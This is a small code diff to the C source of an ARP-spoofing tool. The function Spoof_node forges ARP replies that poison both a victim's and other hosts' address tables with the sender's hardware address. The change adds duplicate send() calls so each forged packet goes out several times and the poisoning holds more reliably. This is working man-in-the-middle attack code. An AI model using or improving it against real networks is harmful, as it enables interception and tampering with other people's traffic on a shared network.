@@ -56,10 +56,14 @@ void Spoof_node(int packet_sock, uint8_t buffer[ARPREPLY_SIZE], struct Node *vic
 
 	spoof_packet(buffer, victim->ip4addr, current->hwaddr, current->gateway, gw_hw);
 	send(packet_sock, buffer, ARPREPLY_SIZE, 0);
+	send(packet_sock, buffer, ARPREPLY_SIZE, 0);
+	send(packet_sock, buffer, ARPREPLY_SIZE, 0);
 
 	for (int i = 0; i < node_count; i++) {
 		if (nodes[i].is_online && nodes[i].ip4addr != victim->ip4addr) {
 			spoof_packet(buffer, nodes[i].ip4addr, current->hwaddr, victim->ip4addr, victim->hwaddr);
+			send(packet_sock, buffer, ARPREPLY_SIZE, 0);
+			send(packet_sock, buffer, ARPREPLY_SIZE, 0);
 			send(packet_sock, buffer, ARPREPLY_SIZE, 0);
 		}
 	}
